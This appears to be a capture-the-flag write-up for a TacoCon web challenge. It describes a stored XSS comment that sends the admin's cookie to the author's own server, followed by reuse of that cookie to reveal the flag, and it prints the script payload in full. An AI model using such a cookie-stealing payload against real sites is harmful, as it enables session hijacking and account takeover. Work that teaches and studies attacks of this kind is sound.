# Taco Chef Feedback

```
This website seems to be constantly monitored. In fact, the web traffic logs indicate that this website is checked once every minute.

We have reliable intel that the protected portion of this website holds information about the vault. But it seems that only the admin can see the protected part of this page.

http://challenges.tacocon.party:8345
```

This one was pretty straightforward for me, it required a little XSS. Basically we know that the admin constantly monitors the comments, so if we can force the admin to visit a website of our choosing, we can harvest their cookie that makes the server think they're an admin. From there, we can simply impersonate them by setting the cookie on our own brower/session. 

I started by going to the form and noticing that I couldn't access the comments section (because I'm not an admin), but I can leave a comment. So I left a comment with the following:

```
<script>document.location='http://alexloney.com/xss.php?' + document.cookie</script>
```

I then threw together a simple PHP script that will take the request and write it to a file. Now I just wait...

Once the admin had viewed the page, it wrote a cookie to my script containing the following:

```
admin_id=kCxpAJacgNoGZPEPsgcdAhaVCAXdQyLa6wHUyNPYLhDMYPuEr4inwLmRxsEPqXkK
```

Upon setting that cookie, I can view the contents of the comments section, which has the following:

```
Tacocon{XSS_is_a_great_way_to_steal_cookies!}
```
